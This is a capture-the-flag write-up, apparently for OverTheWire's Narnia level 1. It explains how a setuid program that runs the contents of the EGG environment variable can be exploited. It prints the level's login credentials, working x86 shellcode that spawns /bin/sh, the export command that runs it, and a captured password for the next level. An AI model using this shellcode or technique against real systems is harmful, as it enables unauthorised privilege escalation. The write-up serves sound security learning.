## Login 

` SSH : ssh narnia1@narnia.labs.overthewire.org -p 2226 `
` Pass : WDcYUTG5ul `

## Solution

First, let’s try to execute the program…

```
narnia1@narnia:~$ cd /narnia/
narnia1@narnia:/narnia$ ./narnia1 
Give me something to execute at the env-variable EGG
```

Hum… It seems that we need to initialize an environment variable named **EGG**.
### Source Code
Let’s clarify that with the source code.

```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

Here, the code will execute anything we put in the **EGG** environment variable, we only need to find a shellcode and set the **EGG** variable. I used a random shellcode from the [Exploit Database](https://www.exploit-db.com/exploits/44594).

```
; https://www.exploit-db.com/exploits/44594
section .text
global _start

_start:
    xor ecx, ecx
    mul ecx
    push ecx
    mov edi, 0x978CD0D0
    mov esi, 0x91969DD0
    not edi
    not esi
    push edi
    push esi
    mov ebx, esp
    mov al, 0xb
    int 0x80
```

Here is the shellcode :

```
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80
```

Now, let’s export it as an environment variable an re-execute the program.

```
narnia1@narnia:/narnia$ export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
5agRAXeBdG
```

Done !